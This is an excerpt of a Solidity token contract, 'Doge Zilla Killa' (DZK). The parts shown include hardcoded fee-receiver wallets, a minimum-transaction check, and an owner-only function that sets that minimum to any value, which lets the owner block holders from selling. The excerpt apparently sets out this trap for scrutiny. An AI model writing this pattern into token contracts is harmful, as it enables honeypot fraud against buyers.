...
contract DZK  is IBEP20, Auth {
    ...
    string constant _name = "Doge Zilla Killa";
    string constant _symbol = "DZK";
    uint8 constant _decimals = 4;

    uint256 _totalSupply =  70 * 10**9 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply / 100;
    uint256 private _minTxAmount = 100 * 10**_decimals;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xfD012cFD1356ab45d352303B29A507C7E344d0f2;
        teamFeeReceiver = 0xB2b98f9c61CF976d91Fc9B4528285298c2DdB564;
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        ...
        require(amount >= _minTxAmount, "minimum TX limit not met");
    }
    ...
    function setMinTxAbsolute(uint256 amount) external onlyOwner {
        _minTxAmount = amount;
    }
